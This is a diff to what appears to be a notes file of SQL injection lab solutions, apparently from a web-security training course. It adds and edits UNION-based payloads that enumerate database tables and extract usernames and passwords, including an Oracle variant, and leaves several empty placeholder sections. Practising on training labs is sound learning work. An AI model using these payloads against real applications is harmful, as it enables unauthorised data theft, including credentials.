@@ -43,7 +43,7 @@ administrator'--
 ### Lab5: SQL injection attack, listing the database contents on non-Oracle databases
 
   ```sh
-  order by 2#
+  order by 2--
   ```
   ```sh
 '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
@@ -54,3 +54,25 @@ administrator'--
   ```sh
 '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
   ```
+### Lab: SQL injection attack, listing the database contents on Oracle
+```sh
+'+UNION+SELECT+'abc','def'+FROM+dual--
+```
+```sh
+
+```
+
+### 
+```sh
+
+```
+```sh
+
+```
+###
+```sh
+
+```
+```sh
+
+```
